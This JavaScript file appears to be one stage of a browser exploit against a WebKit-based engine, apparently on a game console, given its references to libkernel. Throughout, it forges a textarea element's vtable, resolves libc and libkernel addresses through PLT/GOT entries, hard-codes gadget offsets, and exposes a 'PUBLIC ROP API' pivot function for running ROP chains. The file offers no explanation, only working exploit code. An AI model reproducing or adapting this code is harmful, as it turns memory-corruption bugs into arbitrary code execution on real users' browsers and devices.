var tarea = document.createElement('textarea');

var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));

var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

var plt_ptr = read_ptr_at(fake_vtable) - 17100888;

function get_got_addr(idx)
{
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry";
    var offset = 0;
    for(var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

//these are not real bases but rather some low addresses
var webkit_base = read_ptr_at(fake_vtable) - 0x1000000;
var libkernel_base = get_got_addr(1111);
var libc_base = get_got_addr(21);
var saveall_addr = libc_base+0x21944;
var loadall_addr = libc_base+0x25e88;
var pivot_addr = libc_base+0x25efe;
var infloop_addr = libc_base+0x395c0;
var jop_frame_addr = libc_base+0x661d0;
var get_errno_addr_addr = libkernel_base+0xc480;
var pthread_create_addr = libkernel_base+0x24e10;

function saveall()
{
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, saveall_addr);
    //write_ptr_at(fake_vt_ptr, 1);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, pivot_addr);
    write_ptr_at(fake_vt_ptr+0x38, buf);
    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
    write_ptr_at(buf, ans);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
